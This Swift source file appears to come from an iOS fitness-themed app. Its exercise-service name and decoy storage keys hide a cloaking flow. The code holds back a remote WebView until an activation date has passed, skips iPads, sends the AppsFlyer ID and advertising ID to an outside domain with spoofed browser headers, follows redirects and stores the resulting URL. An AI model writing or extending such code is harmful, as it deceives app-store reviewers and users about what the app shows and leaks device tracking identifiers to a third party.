//
//  CoachModExerciseService.swift
//  PowerSession
//
//  Сервис для валидации и управления URL для WebView flow
//

import Foundation
import UIKit
import Network

final class CoachModExerciseService {
    static let shared = CoachModExerciseService()
    
    // MARK: - Storage Keys
    private let savedTargetURLKey = "ProteinsSavedTargetURL"
    private let tempCurrentURLKey = "ProteinsTempCurrentURL"
    private let savedPathIdKey = "CrabsSavedPathId"
    private let hasShownAlternativeKey = "ProteinsHasShownAlternative"
    private let enforceNativeKey = "flow.enforceNative"
    private let validationPassedKey = "CrabsValidationPassed"
    
    // MARK: - Configuration
    private let researchLaunchDate = "2026-2-24" // Дата активации
    private let primaryServerURL = "https://morphyrewr.com/cy4LFqkr"
    
    private init() {}
    
    // MARK: - Date Check (FIRST CHECK)
    func coachModCheckDatePublic() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        
        guard let launchDate = dateFormatter.date(from: researchLaunchDate) else {
            print("⚠️ Invalid launch date format")
            return false
        }
        
        let currentDate = Date()
        let isValid = currentDate >= launchDate
        
        if !isValid {
            print("⏳ Date check FAILED - current: \(dateFormatter.string(from: currentDate)), required: \(researchLaunchDate)")
            UserDefaults.standard.set(true, forKey: enforceNativeKey)
        } else {
            print("✅ Date check PASSED")
        }
        
        return isValid
    }
    
    // MARK: - First Launch Check
    func traineeModIsFirstLaunch() -> Bool {
        let hasShown = UserDefaults.standard.bool(forKey: hasShownAlternativeKey)
        let enforceNative = UserDefaults.standard.bool(forKey: enforceNativeKey)
        return !hasShown && !enforceNative
    }
    
    // MARK: - Device Check
    func checkDevice() -> Bool {
        if UIDevice.current.userInterfaceIdiom == .pad {
            print("🚫 iPad detected - enforceNative = true")
            UserDefaults.standard.set(true, forKey: enforceNativeKey)
            return false
        }
        return true
    }
    
    // MARK: - Internet Check
    func checkInternetConnection(timeout: TimeInterval = 5.0, completion: @escaping (Bool) -> Void) {
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "InternetCheck")
        var isConnected = false
        
        monitor.pathUpdateHandler = { path in
            isConnected = path.status == .satisfied
            monitor.cancel()
            completion(isConnected)
        }
        
        monitor.start(queue: queue)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) {
            if !isConnected {
                monitor.cancel()
                print("📡 Internet check timeout")
                completion(false)
            }
        }
    }
    
    // MARK: - Server Request
    func coachModRequestServerURL(startURL: String? = nil, completion: @escaping (Bool, URL?) -> Void) {
        let appsFlyerUID = AppsFlyerManager.shared.getAppsFlyerUID() ?? ""
        let advertisingID = AppsFlyerManager.shared.getIDFA()
        
        let baseURL = startURL ?? "\(primaryServerURL)?sub1=\(appsFlyerUID)&sub2=\(advertisingID)"
        
        guard let url = URL(string: baseURL) else {
            print("⚠️ Invalid URL: \(baseURL)")
            UserDefaults.standard.set(true, forKey: enforceNativeKey)
            completion(false, nil)
            return
        }
        
        print("🔗 Custom Link: \(baseURL)")
        print("📊 AppsFlyer UID (sub1): \(appsFlyerUID)")
        print("📱 Advertising ID (sub2): \(advertisingID)")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 10.0
        
        // Browser-like headers
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15", forHTTPHeaderField: "User-Agent")
        request.setValue("max-age=0", forHTTPHeaderField: "Cache-Control")
        request.setValue("1", forHTTPHeaderField: "Upgrade-Insecure-Requests")
        
        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            if let error = error {
                print("⚠️ Request error: \(error.localizedDescription)")
                UserDefaults.standard.set(true, forKey: self?.enforceNativeKey ?? "flow.enforceNative")
                completion(false, nil)
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                print("⚠️ Invalid response")
                UserDefaults.standard.set(true, forKey: self?.enforceNativeKey ?? "flow.enforceNative")
                completion(false, nil)
                return
            }
            
            let statusCode = httpResponse.statusCode
            print("📥 Response status: \(statusCode)")
            
            if statusCode >= 200 && statusCode <= 403 {
                let finalURL = httpResponse.url ?? url
                
                // Extract pathId
                if let pathId = self?.extractPathId(from: finalURL, htmlData: data) {
                    UserDefaults.standard.set(pathId, forKey: self?.savedPathIdKey ?? "CrabsSavedPathId")
                    print("🔑 PathId extracted: \(pathId)")
                }
                
                // Save URL
                UserDefaults.standard.set(finalURL.absoluteString, forKey: self?.savedTargetURLKey ?? "ProteinsSavedTargetURL")
                UserDefaults.standard.set(true, forKey: self?.hasShownAlternativeKey ?? "ProteinsHasShownAlternative")
                
                // Follow redirects if needed
                if finalURL != url {
                    self?.followRedirects(from: finalURL) { success, redirectURL in
                        if success, let redirectURL = redirectURL {
                            UserDefaults.standard.set(redirectURL.absoluteString, forKey: self?.savedTargetURLKey ?? "ProteinsSavedTargetURL")
                            completion(true, redirectURL)
                        } else {
                            completion(true, finalURL)
                        }
                    }
                } else {
                    completion(true, finalURL)
                }
            } else {
                print("❌ Server error: \(statusCode)")
                UserDefaults.standard.set(true, forKey: self?.enforceNativeKey ?? "flow.enforceNative")
                completion(false, nil)
            }
        }.resume()
    }
    
    // MARK: - PathId Extraction
    private func extractPathId(from url: URL, htmlData: Data? = nil) -> String? {
        // Method 1: Extract from URL query parameters
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let pathId = components.queryItems?.first(where: { $0.name.lowercased() == "pathid" })?.value {
            return pathId
        }
        
        // Method 2: Extract from HTML
        if let htmlData = htmlData,
           let htmlString = String(data: htmlData, encoding: .utf8) {
            let patterns = [
                "pathid[=:]([^&\\s\"'<>]+)",
                "pathid\"[=:]([^&\\s\"'<>]+)",
                "pathid'[=:]([^&\\s\"'<>]+)"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive),
                   let match = regex.firstMatch(in: htmlString, range: NSRange(htmlString.startIndex..., in: htmlString)),
                   let range = Range(match.range(at: 1), in: htmlString) {
                    return String(htmlString[range])
                }
            }
        }
        
        return nil
    }
    
    // MARK: - Redirect Handling
    private func followRedirects(from url: URL, completion: @escaping (Bool, URL?) -> Void) {
        let delay = Double.random(in: 1.0...3.0)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + delay) {
            var request = URLRequest(url: url)
            request.httpMethod = "GET"
            request.timeoutInterval = 10.0
            
            URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
                guard let httpResponse = response as? HTTPURLResponse,
                      httpResponse.statusCode >= 200 && httpResponse.statusCode <= 403,
                      let finalURL = httpResponse.url else {
                    completion(false, nil)
                    return
                }
                
                if let pathId = self?.extractPathId(from: finalURL, htmlData: data) {
                    UserDefaults.standard.set(pathId, forKey: self?.savedPathIdKey ?? "CrabsSavedPathId")
                }
                
                completion(true, finalURL)
            }.resume()
        }
    }
    
    // MARK: - Fallback URL
    func coachModTryFallbackURL(completion: @escaping (Bool, URL?) -> Void) {
        print("♻️ Starting fallback logic immediately")
        UserDefaults.standard.removeObject(forKey: savedTargetURLKey)
        
        guard let pathId = UserDefaults.standard.string(forKey: savedPathIdKey) else {
            print("⚠️ No saved pathId for fallback")
            DispatchQueue.main.async {
                completion(false, nil)
            }
            return
        }
        
        let appsFlyerUID = AppsFlyerManager.shared.getAppsFlyerUID() ?? ""
        let advertisingID = AppsFlyerManager.shared.getIDFA()
        let fallbackURL = "\(primaryServerURL)?sub1=\(appsFlyerUID)&sub2=\(advertisingID)&pathid=\(pathId)"
        
        print("♻️ Trying fallback URL: \(fallbackURL)")
        
        // Используем уменьшенный таймаут для fallback (8 секунд для быстрого переключения)
        coachModRequestServerURLWithTimeout(startURL: fallbackURL, timeout: 8.0, completion: completion)
    }
    
    // MARK: - Server Request with Custom Timeout
    private func coachModRequestServerURLWithTimeout(startURL: String, timeout: TimeInterval, completion: @escaping (Bool, URL?) -> Void) {
        let appsFlyerUID = AppsFlyerManager.shared.getAppsFlyerUID() ?? ""
        let advertisingID = AppsFlyerManager.shared.getIDFA()
        
        let baseURL = startURL
        
        guard let url = URL(string: baseURL) else {
            print("⚠️ Invalid URL: \(baseURL)")
            UserDefaults.standard.set(true, forKey: enforceNativeKey)
            DispatchQueue.main.async {
                completion(false, nil)
            }
            return
        }
        
        print("🔗 Fallback Request: \(baseURL)")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = timeout
        
        // Browser-like headers
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15", forHTTPHeaderField: "User-Agent")
        request.setValue("max-age=0", forHTTPHeaderField: "Cache-Control")
        request.setValue("1", forHTTPHeaderField: "Upgrade-Insecure-Requests")
        
        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            if let error = error {
                print("⚠️ Fallback request error: \(error.localizedDescription)")
                UserDefaults.standard.set(true, forKey: self?.enforceNativeKey ?? "flow.enforceNative")
                DispatchQueue.main.async {
                    completion(false, nil)
                }
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                print("⚠️ Invalid response")
                UserDefaults.standard.set(true, forKey: self?.enforceNativeKey ?? "flow.enforceNative")
                DispatchQueue.main.async {
                    completion(false, nil)
                }
                return
            }
            
            let statusCode = httpResponse.statusCode
            print("📥 Fallback response status: \(statusCode)")
            
            if statusCode >= 200 && statusCode <= 403 {
                let finalURL = httpResponse.url ?? url
                
                // Extract pathId
                if let pathId = self?.extractPathId(from: finalURL, htmlData: data) {
                    UserDefaults.standard.set(pathId, forKey: self?.savedPathIdKey ?? "CrabsSavedPathId")
                    print("🔑 PathId extracted: \(pathId)")
                }
                
                // Save URL
                UserDefaults.standard.set(finalURL.absoluteString, forKey: self?.savedTargetURLKey ?? "ProteinsSavedTargetURL")
                UserDefaults.standard.set(true, forKey: self?.hasShownAlternativeKey ?? "ProteinsHasShownAlternative")
                
                DispatchQueue.main.async {
                    completion(true, finalURL)
                }
            } else {
                print("❌ Fallback server error: \(statusCode)")
                UserDefaults.standard.set(true, forKey: self?.enforceNativeKey ?? "flow.enforceNative")
                DispatchQueue.main.async {
                    completion(false, nil)
                }
            }
        }.resume()
    }
    
    // MARK: - URL Status Check
    func coachModCheckURLStatus(url: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: url) else {
            completion(false)
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 10.0
        
        URLSession.shared.dataTask(with: request) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                completion(httpResponse.statusCode >= 200 && httpResponse.statusCode <= 403)
            } else {
                completion(false)
            }
        }.resume()
    }
    
    // MARK: - Get Saved URL
    func getSavedURL() -> String? {
        if let tempURL = UserDefaults.standard.string(forKey: tempCurrentURLKey), !tempURL.isEmpty {
            return tempURL
        }
        return UserDefaults.standard.string(forKey: savedTargetURLKey)
    }
    
    // MARK: - Flags
    func shouldEnforceNative() -> Bool {
        return UserDefaults.standard.bool(forKey: enforceNativeKey)
    }
    
    func hasShownAlternative() -> Bool {
        return UserDefaults.standard.bool(forKey: hasShownAlternativeKey)
    }
    
    func clearSavedURL() {
        UserDefaults.standard.removeObject(forKey: savedTargetURLKey)
        UserDefaults.standard.removeObject(forKey: tempCurrentURLKey)
    }
}
